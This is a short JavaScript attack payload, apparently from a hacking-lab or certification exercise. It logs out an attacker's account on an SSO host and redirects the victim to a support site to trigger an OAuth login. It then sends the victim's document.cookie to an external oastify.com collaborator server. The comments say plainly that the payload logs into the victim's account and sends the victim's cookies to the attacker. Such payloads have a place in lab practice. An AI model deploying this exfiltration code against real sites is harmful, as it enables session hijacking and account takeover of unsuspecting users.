//Logout Attacker's Account
navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");

//Login to Victim's Account using oAuth Login
window.location.href = "http://support-jqn7t8.hackthecert.systems/home";

//Send cookie to Attacker Server
var link="http://ta72h7h5cznpicy5o6kztaig87ex2m.oastify.com/VictimCookies="+document.cookie;
navigator.sendBeacon(link,"");
